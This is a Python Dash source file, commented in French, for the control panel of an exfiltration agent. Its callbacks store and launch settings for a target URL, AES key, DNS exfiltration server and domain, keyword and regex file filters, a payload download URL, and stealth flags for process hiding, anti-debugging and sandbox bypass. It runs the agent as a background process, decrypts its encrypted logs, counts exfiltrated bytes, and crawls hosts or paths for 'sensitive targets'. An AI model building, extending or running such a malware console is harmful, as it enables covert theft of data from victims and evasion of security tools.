@app.callback(Output('dns-domain-hidden', 'value', allow_duplicate=True), Input('dns-domain', 'value'), prevent_initial_call=True)
def _update_hidden_dns_domain(value): return value if value is not None else ''

@app.callback(Output('file-types-hidden', 'value', allow_duplicate=True), Input('file-types', 'value'), prevent_initial_call=True)
def _update_hidden_file_types(value): return value if value is not None else ''

@app.callback(Output('exclude-types-hidden', 'value', allow_duplicate=True), Input('exclude-types', 'value'), prevent_initial_call=True)
def _update_hidden_exclude_types(value): return value if value is not None else ''

@app.callback(Output('min-size-hidden', 'value', allow_duplicate=True), Input('min-size', 'value'), prevent_initial_call=True)
def _update_hidden_min_size(value): return value if value is not None else ''

@app.callback(Output('max-size-hidden', 'value', allow_duplicate=True), Input('max-size', 'value'), prevent_initial_call=True)
def _update_hidden_max_size(value): return value if value is not None else ''

@app.callback(Output('keywords-hidden', 'value', allow_duplicate=True), Input('keywords', 'value'), prevent_initial_call=True)
def _update_hidden_keywords(value): return value if value is not None else ''

@app.callback(Output('regex-patterns-hidden', 'value', allow_duplicate=True), Input('regex-patterns', 'value'), prevent_initial_call=True)
def _update_hidden_regex_patterns(value): return value if value is not None else ''

# NOUVEAUX CALLBACKS DE SYNCHRONISATION POUR LES CHAMPS DE L'EXPLORATEUR
@app.callback(Output('explorer-target-host-hidden', 'value', allow_duplicate=True), Input('explorer-target-host-display', 'value'), prevent_initial_call=True)
def _update_hidden_explorer_target_host(value): return value if value is not None else ''

@app.callback(Output('explorer-base-path-hidden', 'value', allow_duplicate=True), Input('explorer-base-path-display', 'value'), prevent_initial_call=True)
def _update_hidden_explorer_base_path(value): return value if value is not None else ''

@app.callback(Output('explorer-max-depth-hidden', 'value', allow_duplicate=True), Input('explorer-max-depth-display', 'value'), prevent_initial_call=True)
def _update_hidden_explorer_max_depth(value): return value if value is not None else ''

# NOUVEAUX CALLBACKS DE SYNCHRONISATION POUR PAYLOAD ET STEALTH (si non déjà faits)
@app.callback(Output('payload-url-hidden', 'value', allow_duplicate=True), Input('payload-source-url-visible', 'value'), prevent_initial_call=True)
def _update_hidden_payload_url(value): return value if value is not None else ''

@app.callback(Output('payload-path-hidden', 'value', allow_duplicate=True), Input('payload-target-path-visible', 'value'), prevent_initial_call=True)
def _update_hidden_payload_path(value): return value if value is not None else ''

@app.callback(Output('threads-hidden', 'value', allow_duplicate=True), Input('threads', 'value'), prevent_initial_call=True)
def _update_hidden_threads(value): return value if value is not None else ''

# Correction ici: la valeur de 'debug-mode' (et autres checklists) est une LISTE.
# On doit la convertir en chaîne pour l'input caché.
@app.callback(Output('debug-mode-hidden', 'value', allow_duplicate=True), Input('debug-mode', 'value'), prevent_initial_call=True)
def _update_hidden_debug_mode(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')

@app.callback(Output('no-clean-hidden', 'value', allow_duplicate=True), Input('no-clean', 'value'), prevent_initial_call=True)
def _update_hidden_no_clean(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')

@app.callback(Output('no-anti-evasion-hidden', 'value', allow_duplicate=True), Input('no-anti-evasion', 'value'), prevent_initial_call=True)
def _update_hidden_no_anti_evasion(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')

@app.callback(Output('stealth-hide-process-hidden', 'value', allow_duplicate=True), Input('stealth-hide-process', 'value'), prevent_initial_call=True)
def _update_hidden_stealth_hide_process(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')

@app.callback(Output('stealth-anti-debug-hidden', 'value', allow_duplicate=True), Input('stealth-anti-debug', 'value'), prevent_initial_call=True)
def _update_hidden_stealth_anti_debug(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')

@app.callback(Output('stealth-sandbox-bypass-hidden', 'value', allow_duplicate=True), Input('stealth-sandbox-bypass', 'value'), prevent_initial_call=True)
def _update_hidden_stealth_sandbox_bypass(value): return ','.join(value) if isinstance(value, list) else (value if value is not None else '')


@app.callback(
    # Output principal dynamique, toujours pour le dummy-output de l'input cliqué
    Output({'type': 'dummy-output', 'input_id': MATCH}, 'children'),
    Output({'type': 'apply-button', 'input_id': MATCH}, 'style'), # Style du bouton cliqué
    Input({'type': 'apply-button', 'input_id': ALL}, 'n_clicks'), # Input: n_clicks de TOUS les boutons APPLY
    State({'type': 'apply-button', 'input_id': MATCH}, 'id'), # State: l'ID du bouton qui a déclenché

    # Les valeurs DOIVENT PROVENIR DES INPUTS CACHÉS car ils sont toujours dans le DOM
    # Les noms d'arguments correspondent maintenant aux inputs cachés
    State('target-url-hidden', 'value'),
    State('scan-path-hidden', 'value'),
    State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'),
    State('dns-server-hidden', 'value'),
    State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'),
    State('exclude-types-hidden', 'value'),
    State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'),
    State('keywords-hidden', 'value'),
    State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'),
    State('payload-path-hidden', 'value'),
    State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'), # Valeur STRING du hidden input
    State('no-clean-hidden', 'value'), # Valeur STRING du hidden input
    State('no-anti-evasion-hidden', 'value'), # Valeur STRING du hidden input

    State('explorer-target-host-hidden', 'value'),
    State('explorer-base-path-hidden', 'value'),
    State('explorer-max-depth-hidden', 'value'),

    State('stealth-hide-process-hidden', 'value'), # Valeur STRING du hidden input
    State('stealth-anti-debug-hidden', 'value'), # Valeur STRING du hidden input
    State('stealth-sandbox-bypass-hidden', 'value'), # Valeur STRING du hidden input

    prevent_initial_call=True
)
def apply_and_save_single_setting(n_clicks_list, button_id_match,
                                  # Les arguments reçoivent maintenant les valeurs des inputs cachés (strings)
                                  target_url_h, scan_path_h, aes_key_h, exfil_method_h, dns_server_h, dns_domain_h,
                                  file_types_h, exclude_types_h, min_size_h, max_size_h, keywords_h, regex_patterns_h,
                                  payload_url_h, payload_path_h, threads_h, debug_mode_val_str_h, no_clean_val_str_h, no_anti_evasion_val_str_h,
                                  explorer_target_host_h, explorer_base_path_h, explorer_max_depth_h,
                                  stealth_hide_process_val_str_h, stealth_anti_debug_val_str_h, stealth_sandbox_bypass_val_str_h):
    
    ctx = dash.callback_context
    if not ctx.triggered:
        # Assurez-vous de retourner dash.no_update pour tous les Outputs
        return dash.no_update, dash.no_update

    trigger_input_id_dict = ctx.triggered_id
    
    # S'assurer que c'est bien un bouton APPLY qui a déclenché
    if trigger_input_id_dict.get('type') != 'apply-button':
        return dash.no_update, dash.no_update

    # Convertir les valeurs STRING des hidden inputs en LISTES pour la logique
    debug_mode_val = debug_mode_val_str_h.split(',') if debug_mode_val_str_h else []
    no_clean_val = no_clean_val_str_h.split(',') if no_clean_val_str_h else []
    no_anti_evasion_val = no_anti_evasion_val_str_h.split(',') if no_anti_evasion_val_str_h else []
    stealth_hide_process_val = stealth_hide_process_val_str_h.split(',') if stealth_hide_process_val_str_h else []
    stealth_anti_debug_val = stealth_anti_debug_val_str_h.split(',') if stealth_anti_debug_val_str_h else []
    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str_h.split(',') if stealth_sandbox_bypass_val_str_h else []

    # Débogage : Afficher la valeur de l'input correspondant au bouton cliqué
    input_id_of_triggered_button = trigger_input_id_dict['input_id']
    
    # Mappage des IDs UI (inputs visibles) aux arguments du callback
    # Utilisation d'un dictionnaire pour rendre cela plus propre
    # Les arguments du callback ont déjà les valeurs des hidden inputs
    values_map = {
        'target-url': target_url_h,
        'scan-path': scan_path_h,
        'aes-key': aes_key_h,
        'exfil-method': exfil_method_h,
        'dns-server': dns_server_h,
        'dns-domain': dns_domain_h,
        'file-types': file_types_h,
        'exclude-types': exclude_types_h,
        'min-size': min_size_h,
        'max-size': max_size_h,
        'keywords': keywords_h,
        'regex-patterns': regex_patterns_h,
        'payload-url-control-tab-visible': payload_url_h,
        'payload-path-control-tab-visible': payload_path_h,
        'threads': threads_h,
        'debug-mode': debug_mode_val, # C'est déjà la liste ici
        'no-clean': no_clean_val,
        'no-anti-evasion': no_anti_evasion_val,
        'explorer-target-host-display': explorer_target_host_h,
        'explorer-base-path-display': explorer_base_path_h,
        'explorer-max-depth-display': explorer_max_depth_h,
        'stealth-hide-process': stealth_hide_process_val,
        'stealth-anti-debug': stealth_anti_debug_val,
        'stealth-sandbox-bypass': stealth_sandbox_bypass_val,
    }
    mapped_value = values_map.get(input_id_of_triggered_button, "N/A")


    print(f"\n[DEBUG_SAVE] Callback apply_and_save_single_setting déclenché par : {input_id_of_triggered_button}")
    print(f"[DEBUG_SAVE] Valeur lue pour {input_id_of_triggered_button}: {mapped_value}")
    print(f"[DEBUG_SAVE] Valeur de default_explorer_target_host (avant sauvegarde): {explorer_target_host_h}")


    config_to_save = {
        "aes_key": aes_key_h, "default_target_url": target_url_h, "default_scan_path": scan_path_h,
        "default_file_types": file_types_h, "default_exclude_types": exclude_types_h,
        "default_min_size": min_size_h, "default_max_size": max_size_h,
        "default_dns_server": dns_server_h, "default_dns_domain": dns_domain_h,
        "default_keywords": keywords_h, "default_regex_patterns": regex_patterns_h,
        "default_payload_url": payload_url_h, "default_payload_path": payload_path_h,
        "default_threads": threads_h,
        "default_debug_mode": debug_mode_val,
        "default_no_clean": no_clean_val,
        "default_no_anti_evasion": no_anti_evasion_val,
        "default_explorer_target_host": explorer_target_host_h,
        "default_explorer_base_path": explorer_base_path_h,
        "default_explorer_depth": explorer_max_depth_h,
        "default_exfil_method": exfil_method_h,
        "default_stealth_hide_process": stealth_hide_process_val,
        "default_stealth_anti_debug": stealth_anti_debug_val,
        "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
    }
    save_shared_config(config_to_save)
    print(f"[DEBUG_SAVE] Appel de save_shared_config avec default_explorer_target_host: {config_to_save['default_explorer_target_host']}")

    return f"Applied: {input_id_of_triggered_button} -> {mapped_value}", CYBER_BUTTON_APPLY_ACTIVE


@app.callback(
    Output('save-config-button', 'children'),
    Input('save-config-button', 'n_clicks'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'),
    State('no-clean-hidden', 'value'),
    State('no-anti-evasion-hidden', 'value'),
    State('explorer-target-host-hidden', 'value'),
    State('explorer-base-path-hidden', 'value'),
    State('explorer-max-depth-hidden', 'value'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def save_config_final(n_clicks,
                      target_url_h, scan_path_h, aes_key_h, exfil_method_h, dns_server_h, dns_domain_h,
                      file_types_h, exclude_types_h, min_size_h, max_size_h, keywords_h, regex_patterns_h,
                      payload_url_h, payload_path_h, threads_h, debug_mode_val_str_h, no_clean_val_str_h, no_anti_evasion_val_str_h,
                      explorer_target_host_h, explorer_base_path_h, explorer_max_depth_h,
                      stealth_hide_process_val_str_h, stealth_anti_debug_val_str_h, stealth_sandbox_bypass_val_str_h):
    if n_clicks == 0:
        return "SAVE ALL CONFIG"

    debug_mode_val = debug_mode_val_str_h.split(',') if debug_mode_val_str_h else []
    no_clean_val = no_clean_val_str_h.split(',') if no_clean_val_str_h else []
    no_anti_evasion_val = no_anti_evasion_val_str_h.split(',') if no_anti_evasion_val_str_h else []
    stealth_hide_process_val = stealth_hide_process_val_str_h.split(',') if stealth_hide_process_val_str_h else []
    stealth_anti_debug_val = stealth_anti_debug_val_str_h.split(',') if stealth_anti_debug_val_str_h else []
    stealth_sandbox_bypass_val = stealth_sandbox_bypass_val_str_h.split(',') if stealth_sandbox_bypass_val_str_h else []


    config_to_save = {
        "aes_key": aes_key_h, "default_target_url": target_url_h, "default_scan_path": scan_path_h,
        "default_file_types": file_types_h, "default_exclude_types": exclude_types_h,
        "default_min_size": min_size_h, "default_max_size": max_size_h,
        "default_dns_server": dns_server_h, "default_dns_domain": dns_domain_h,
        "default_keywords": keywords_h, "default_regex_patterns": regex_patterns_h,
        "default_payload_url": payload_url_h, "default_payload_path": payload_path_h,
        "default_threads": threads_h,
        "default_debug_mode": debug_mode_val,
        "default_no_clean": no_clean_val,
        "default_no_anti_evasion": no_anti_evasion_val,
        "default_explorer_target_host": explorer_target_host_h,
        "default_explorer_base_path": explorer_base_path_h,
        "default_explorer_depth": explorer_max_depth_h,
        "default_exfil_method": exfil_method_h,
        "default_stealth_hide_process": stealth_hide_process_val,
        "default_stealth_anti_debug": stealth_anti_debug_val,
        "default_stealth_sandbox_bypass": stealth_sandbox_bypass_val,
    }
    save_shared_config(config_to_save)
    return "CONFIG SAVED!"


@app.callback(
    Output('live-log-stream-display-buffer', 'children', allow_duplicate=True),
    Output('agent-stats-store', 'data', allow_duplicate=True),
    Input('launch-button', 'n_clicks'),
    State('target-url-hidden', 'value'), State('scan-path-hidden', 'value'), State('aes-key-hidden', 'value'),
    State('exfil-method-hidden', 'value'), State('dns-server-hidden', 'value'), State('dns-domain-hidden', 'value'),
    State('file-types-hidden', 'value'), State('exclude-types-hidden', 'value'), State('min-size-hidden', 'value'),
    State('max-size-hidden', 'value'), State('keywords-hidden', 'value'), State('regex-patterns-hidden', 'value'),
    State('payload-url-hidden', 'value'), State('payload-path-hidden', 'value'), State('threads-hidden', 'value'),
    State('debug-mode-hidden', 'value'),
    State('no-clean-hidden', 'value'),
    State('no-anti-evasion-hidden', 'value'),
    State('agent-stats-store', 'data'),
    State('stealth-hide-process-hidden', 'value'),
    State('stealth-anti-debug-hidden', 'value'),
    State('stealth-sandbox-bypass-hidden', 'value'),
    prevent_initial_call=True
)
def launch_agent(n_clicks, target_url, scan_path, aes_key, exfil_method, dns_server, dns_domain,
                 file_types, exclude_types, min_size, max_size, keywords, regex_patterns,
                 payload_url, payload_path, threads, debug_mode_val_str, no_clean_val_str, no_anti_evasion_val_str,
                 current_stats,
                 stealth_hide_process_val_str, stealth_anti_debug_val_str, stealth_sandbox_bypass_val_str):
    global running_agent_process

    if n_clicks == 0: return dash.no_update, current_stats
    if running_agent_process and running_agent_process.poll() is None:
        return html.Pre("ERROR: AGENT ALREADY RUNNING. STOP IT FIRST.", style=CYBER_STATUS_ERROR), current_stats
    if not target_url or not aes_key:
        return html.Pre("ERROR: TARGET URL AND AES KEY ARE MANDATORY.", style=CYBER_STATUS_ERROR), current_stats
    if exfil_method == 'dns' and (not dns_server or not dns_domain):
        return html.Pre("ERROR: DNS SERVER AND DOMAIN ARE MANDATORY FOR DNS EXFILTRATION.", style=CYBER_STATUS_ERROR), current_stats

    command = [sys.executable, AGENT_PATH]
    command.extend(["--target", target_url, "--scan", scan_path, "--key", aes_key, "--method", exfil_method])
    if exfil_method == 'dns': command.extend(["--dns-server", dns_server, "--dns-domain", dns_domain])
    if file_types: command.extend(["--types", file_types])
    if exclude_types: command.extend(["--exclude-types", exclude_types])
    if min_size: command.extend(["--min-size", str(min_size)])
    if max_size: command.extend(["--max-size", str(max_size)])
    if keywords: command.extend(["--keywords", keywords])
    if regex_patterns: command.extend(["--regex-patterns", regex_patterns])
    if payload_url: command.extend(["--payload-url", payload_url])
    if payload_path: command.extend(["--payload-path", payload_path])
    if threads: command.extend(["--threads", str(threads)])

    # Convertir les valeurs STRING des hidden inputs en LISTES pour la logique du sous-processus
    debug_mode_list = debug_mode_val_str.split(',') if debug_mode_val_str else []
    no_clean_list = no_clean_val_str.split(',') if no_clean_val_str else []
    no_anti_evasion_list = no_anti_evasion_val_str.split(',') if no_anti_evasion_val_str else []
    stealth_hide_process_list = stealth_hide_process_val_str.split(',') if stealth_hide_process_val_str else []
    stealth_anti_debug_list = stealth_anti_debug_val_str.split(',') if stealth_anti_debug_val_str else []
    stealth_sandbox_bypass_list = stealth_sandbox_bypass_val_str.split(',') if stealth_sandbox_bypass_val_str else []


    if 'debug' in debug_mode_list: command.append("--debug")
    if 'no-clean' in no_clean_list: command.append("--no-clean")
    if 'no-anti-evasion' in no_anti_evasion_list: command.append("--no-anti-evasion")

    if 'hide_process' in stealth_hide_process_list: command.append("--hide-process")
    if 'anti_debug' in stealth_anti_debug_list: command.append("--anti-debug")
    if 'sandbox_bypass' in stealth_sandbox_bypass_list: command.append("--sandbox-bypass")

    full_command_str = shlex.join(command)
    _GLOBAL_MODULE_LOGGER.log_info(f"INITIATING COMMAND:\n{full_command_str}")
    _GLOBAL_MODULE_LOGGER.log_info("--- AGENT STARTING (CHECK LOGS FOR DETAILS) ---")

    try:
        running_agent_process = subprocess.Popen(command,
                                                 stdout=subprocess.DEVNULL,
                                                 stderr=subprocess.DEVNULL,
                                                 cwd=AGENT_DIR,
                                                 preexec_fn=os.setsid
                                                 )
        status_message = (
            f"[INFO] AGENT LAUNCHED PID: {running_agent_process.pid}\n"
            f"[INFO] AGENT RUNNING IN BACKGROUND.\n"
            f"[INFO] USE 'REFRESH ENCRYPTED LOGS' BUTTON TO MONITOR ACTIVITY.\n"
            f"[INFO] MONITOR LIVE LOGS IN 'DASHBOARD' OR 'LOGS & STATUS' TABS."
        )
        _GLOBAL_MODULE_LOGGER.log_info(status_message)

        current_stats['agent_status'] = 'RUNNING'
        current_stats['agent_start_time'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        current_stats['files_scanned'] = 0
        current_stats['files_matched'] = 0
        current_stats['data_exfiltrated_bytes'] = 0
        current_stats['exfil_success_count'] = 0
        current_stats['exfil_failed_count'] = 0
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        return html.Pre(status_message, style=CYBER_STATUS_BOX_STYLE), current_stats

    except FileNotFoundError:
        error_msg = f"ERROR: AGENT SCRIPT '{AGENT_PATH}' NOT FOUND."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        current_stats['agent_status'] = 'ERROR'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats
    except Exception as e:
        error_msg = f"ERROR LAUNCHING AGENT: {e}"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        current_stats['agent_status'] = 'ERROR'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats

@app.callback(
    Output('stop-button', 'children'),
    Output('agent-stats-store', 'data', allow_duplicate=True),
    Input('stop-button', 'n_clicks'),
    State('agent-stats-store', 'data'),
    prevent_initial_call=True
)
def stop_agent(n_clicks, current_stats):
    global running_agent_process
    if n_clicks == 0: return dash.no_update, current_stats
    if running_agent_process and running_agent_process.poll() is None:
        try:
            os.killpg(os.getpgid(running_agent_process.pid), signal.SIGINT)
            time.sleep(2)
            if running_agent_process.poll() is None: running_agent_process.terminate()
            time.sleep(1)
            if running_agent_process.poll() is None: running_agent_process.kill()
            running_agent_process = None
            status_msg = "AGENT TERMINATED."
            _GLOBAL_MODULE_LOGGER.log_info(status_msg)
            
            current_stats['agent_status'] = 'TERMINATED'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return status_msg, current_stats
        except ProcessLookupError:
            running_agent_process = None
            status_msg = "AGENT ALREADY TERMINATED OR NOT FOUND."
            _GLOBAL_MODULE_LOGGER.log_warning(status_msg)
            current_stats['agent_status'] = 'INACTIVE'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return status_msg, current_stats
        except Exception as e:
            error_msg = f"ERROR TERMINATING AGENT: {e}"
            _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
            current_stats['agent_status'] = 'ERROR'
            current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR), current_stats
    else:
        status_msg = "NO AGENT RUNNING."
        _GLOBAL_MODULE_LOGGER.log_info(status_msg)
        current_stats['agent_status'] = 'INACTIVE'
        current_stats['agent_last_activity'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return status_msg, current_stats

@app.callback(
    Output('decrypted-logs-output', 'children'),
    Input('refresh-logs-button', 'n_clicks'),
    State('aes-key-hidden', 'value'),
    prevent_initial_call=True
)
def refresh_decrypted_logs(n_clicks, aes_key_for_decrypt):
    if n_clicks == 0: return "DECRYPTED LOGS (IF AVAILABLE)..."
    if AES256Cipher is None:
        error_msg = "DECRYPTION FUNCTION NOT AVAILABLE (AES256Cipher module not imported)."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    temp_log_cipher = None
    if aes_key_for_decrypt:
        try: temp_log_cipher = AES256Cipher(aes_key_for_decrypt)
        except Exception: 
            error_msg = "ERROR: INVALID AES KEY FOR LOG DECRYPTION. PLEASE VERIFY KEY."
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    else: 
        error_msg = "PLEASE PROVIDE AES KEY ABOVE TO DECRYPT LOGS."
        _GLOBAL_MODULE_LOGGER.log_warning(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    
    if not temp_log_cipher: 
        error_msg = "FAILED TO INITIALIZE LOG DECRYPTOR WITH PROVIDED KEY."
        _GLOBAL_MODULE_LOGGER.log_error(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

    try:
        reader_logger_class = globals().get('AgentLogger', None) 
        if reader_logger_class is None:
            error_msg = "AgentLogger class not available for reading encrypted logs."
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

        reader_logger = reader_logger_class(LOG_FILE_PATH, aes_key_for_decrypt, debug_mode=True, stdout_enabled=False)
        
        if hasattr(reader_logger, 'read_and_decrypt_logs'):
            logs = reader_logger.read_and_decrypt_logs()
        else:
            error_msg = "Logger does not support reading encrypted logs. (Missing feature in AgentLogger)."
            _GLOBAL_MODULE_LOGGER.log_warning(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_WARNING)

        if not logs:
            status_msg = "NO DECRYPTABLE LOGS FOUND OR LOGS UNREADABLE/UNCIPHERABLE. HAS AGENT RUN YET?"
            _GLOBAL_MODULE_LOGGER.log_warning(status_msg)
            return html.Pre(status_msg, style=CYBER_STATUS_WARNING)
        
        formatted_logs = []
        for entry in logs:
            formatted_logs.append(f"[{entry.get('timestamp', 'N/A')}] {entry.get('level', 'N/A')}: {entry.get('message', 'N/A')}")
        
        _GLOBAL_MODULE_LOGGER.log_info("Logs chiffrés rafraîchis et déchiffrés.")
        return html.Pre("\n".join(formatted_logs), style={**CYBER_STATUS_BOX_STYLE, 'color': '#7FFF00'})
    except Exception as e:
        error_msg = f"ERROR REFRESHING/DECRYPTING LOGS: {e}. IS AES KEY CORRECT OR LOG FILE CORRUPTED?"
        _GLOBAL_MODULE_LOGGER.log_critical(error_msg)
        return html.Pre(error_msg, style=CYBER_STATUS_ERROR)

@app.callback(Output("download-logs-data", "data"), Input("download-logs-button", "n_clicks"), prevent_initial_call=True)
def download_logs(n_clicks):
    if os.path.exists(LOG_FILE_PATH):
        try:
            with open(LOG_FILE_PATH, "rb") as f: content = f.read()
            _GLOBAL_MODULE_LOGGER.log_info("Téléchargement des logs bruts demandé.")
            return dcc.send_bytes(content, "agent_logs_encrypted.enc")
        except Exception as e: 
            error_msg = f"ERROR READING LOG FILE FOR DOWNLOAD: {e}"
            _GLOBAL_MODULE_LOGGER.log_error(error_msg)
            return html.Pre(error_msg, style=CYBER_STATUS_ERROR)
    return None

# --- Callbacks pour l'explorateur de fichiers ---

@app.callback(
    [Output('explorer-status', 'children'),
     Output('found-files-table', 'data'),
     Output('file-content-output', 'children')],
    [Input('launch-explorer-button', 'n_clicks'),
     Input({'type': 'read-file-button', 'index': ALL}, 'n_clicks')],
    [State('explorer-target-host-hidden', 'value'),
     State('explorer-base-path-hidden', 'value'),
     State('explorer-max-depth-hidden', 'value'),
     State('found-files-table', 'data')],
    prevent_initial_call=True
)
def handle_explorer_actions(launch_n_clicks, read_n_clicks_list, target_host, base_path, max_depth, table_data):
    ctx = dash.callback_context

    if not ctx.triggered:
        raise dash.exceptions.PreventUpdate

    trigger_id = ctx.triggered[0]['prop_id']

    if 'launch-explorer-button' in trigger_id:
        if global_log_streamer: global_log_streamer.clear_logs()
        explorer_log_states['file_explorer']['logs'] = [] # Clear explorer specific logs
        explorer_log_states['file_explorer']['last_index'] = 0

        _GLOBAL_MODULE_LOGGER.log_info("Démarrage de l'exploration via l'interface.")

        if isinstance(global_file_explorer, BaseMockExplorer) or isinstance(global_web_explorer, BaseMockExplorer):
            _GLOBAL_MODULE_LOGGER.log_error("Explorer modules not loaded (using mock implementations). Check server console for import errors.")
            return html.Pre("ERROR: Explorer modules not loaded (using mock implementations). Check server console for import errors.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if not target_host and not base_path:
            _GLOBAL_MODULE_LOGGER.log_error("Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.")
            return html.Pre("ERROR: Either TARGET HOST (URL/IP) or BASE PATH is mandatory for exploration.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        if max_depth is None or max_depth < 0:
            _GLOBAL_MODULE_LOGGER.log_error("Please specify a valid MAX DEPTH (integer >= 0).")
            return html.Pre("ERROR: PLEASE SPECIFY A VALID MAX DEPTH (INTEGER >= 0).", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

        global_file_explorer.reset_state()
        global_web_explorer.reset_state()

        is_web_exploration = False
        # Détermine si c'est une exploration web (URL commençant par http/https ou un domaine sans base_path)
        if target_host and (target_host.startswith("http://") or target_host.startswith("https://") or
                           (re.match(r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$", target_host) and not base_path) or # IP sans base path est web
                           (re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", target_host) and '/' not in target_host and not base_path)): # Domaine sans base path est web
            is_web_exploration = True
            # Normalisation pour s'assurer que target_host est une URL complète pour WebExplorer
            if not target_host.startswith("http"):
                target_host = "http://" + target_host


        found_targets = []
        status_message = ""

        try:
            if is_web_exploration:
                target_url_for_web = target_host
                if base_path: # Si base_path est fourni pour une URL web, on le joint
                    from urllib.parse import urljoin
                    target_url_for_web = urljoin(target_host, base_path.lstrip('/'))

                status_message = html.Pre(f"INITIATING WEB EXPLORATION OF '{target_url_for_web}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                _GLOBAL_MODULE_LOGGER.log_info(f"Initiating web exploration of '{target_url_for_web}' (Depth: {max_depth})...")
                
                # Appel de la nouvelle méthode d'entrée pour l'exploration récursive du WebExplorer
                global_web_explorer.explore_url(target_url_for_web, max_depth) # Utilise la méthode explore_url corrigée
                found_targets = global_web_explorer.get_found_targets()


            else: # Exploration locale (file_explorer)
                if not base_path:
                     _GLOBAL_MODULE_LOGGER.log_error("For local exploration, a BASE PATH is required.")
                     return html.Pre("ERROR: For local exploration, a BASE PATH is required.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                if not os.path.isdir(base_path):
                    _GLOBAL_MODULE_LOGGER.log_error(f"LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.")
                    return html.Pre(f"ERROR: LOCAL BASE PATH '{base_path}' DOES NOT EXIST OR IS NOT A DIRECTORY.", style=CYBER_STATUS_ERROR), [], "SELECTED FILE CONTENT..."

                status_message = html.Pre(f"INITIATING LOCAL FILE EXPLORATION OF '{base_path}' (Depth: {max_depth})...", style=CYBER_STATUS_INFO)
                _GLOBAL_MODULE_LOGGER.log_info(f"Initiating local file exploration of '{base_path}' (Depth: {max_depth})...")
                found_targets = global_file_explorer.explore_path(base_path, max_depth)


            if not found_targets:
                final_status = html.Pre(f"EXPLORATION COMPLETE. NO SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_WARNING)
            else:
                final_status = html.Pre(f"EXPLORATION COMPLETE. {len(found_targets)} SENSITIVE TARGETS FOUND.", style=CYBER_STATUS_BOX_STYLE)
            _GLOBAL_MODULE_LOGGER.log_info(final_status.children)

            table_data = []
            # Définir les types selon le module qui a été utilisé
            # Utilise les attributs de la classe Mock (pour la cohérence avec les anciens ID si les modules réels sont absents)
            file_type_enum = OriginalFileExplorer.TARGET_TYPE_FILE
            dir_type_enum = OriginalFileExplorer.TARGET_TYPE_DIRECTORY
            # Types spécifiques à WebExplorer
            web_content_type_enum = OriginalWebExplorer.TARGET_TYPE_CONTENT
            web_api_type_enum = OriginalWebExplorer.TARGET_TYPE_API
            web_vuln_type_enum = OriginalWebExplorer.TARGET_TYPE_VULN
            web_sitemap_type_enum = OriginalWebExplorer.TARGET_TYPE_SITEMAP_ENTRY
            web_form_type_enum = OriginalWebExplorer.TARGET_TYPE_FORM


            for i, item in enumerate(found_targets):
                actions_html_children = []

                is_actionable_file = False
                can_read_url_content = False

                if item['type'] == file_type_enum: # C'est un fichier local
                    is_actionable_file = True
                elif item['type'] == OriginalWebExplorer.TARGET_TYPE_FILE: # C'est un fichier web
                    is_actionable_file = True
                    can_read_url_content = True # Les fichiers web peuvent aussi être lus via l'URL
